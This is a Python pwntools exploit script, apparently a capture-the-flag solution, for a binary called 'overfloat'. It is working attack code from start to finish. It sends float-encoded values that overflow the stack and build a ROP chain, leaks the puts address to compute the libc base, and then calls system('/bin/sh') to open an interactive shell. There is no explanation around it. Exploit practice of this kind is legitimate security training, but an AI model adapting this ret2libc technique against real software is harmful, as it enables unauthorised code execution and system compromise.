from pwn import *
import struct

def b2f(d):
    return str(struct.unpack('f', bytes(d))[0])


def _pwn():
    r = process('./overfloat')
    raw_input('DEBUG ME')
    for i in range(14):
        r.sendline(b2f('AAAA'))
        #raw_input('Round: '+str(i))
    r.sendline(b2f(p64(0x400a83)[:4]))
    r.sendline(b2f(p64(0x400a83)[4:]))
    r.sendline(b2f(p64(0x602020)[:4]))
    r.sendline(b2f(p64(0x602020)[4:]))
    r.sendline(b2f(p64(0x400690)[:4]))
    r.sendline(b2f(p64(0x400690)[4:]))
    r.sendline(b2f(p64(0x400993)[:4]))
    r.sendline(b2f(p64(0x400993)[4:]))
    r.sendline('done')
    r.recv(1083)

    
    addr = r.recvline()[:-1]
    addr = u64(addr.ljust(8, "\x00"))
    log.success('Puts      : '+hex(addr))
    libc = addr - 0x68f90
    log.success('Libc base : '+hex(libc))
    system = libc + 0x3f480
    log.success('System    : '+hex(system))
    binsh = libc + 0x1619d9
    log.success('/bin/sh   : '+hex(binsh))
    log.info('2nd Round Starting')
    for i in range(14):
        r.sendline(b2f('BBBB'))
    log.info('Sending Payload')
    r.sendline(b2f(p64(0x400a83)[:4]))
    r.sendline(b2f(p64(0x400a83)[4:]))
    r.sendline(b2f(p64(binsh)[:4]))
    r.sendline(b2f(p64(binsh)[4:]))
    r.sendline(b2f(p64(system)[:4]))
    r.sendline(b2f(p64(system)[4:]))
    r.sendline('done')
    r.interactive()    

    
_pwn()
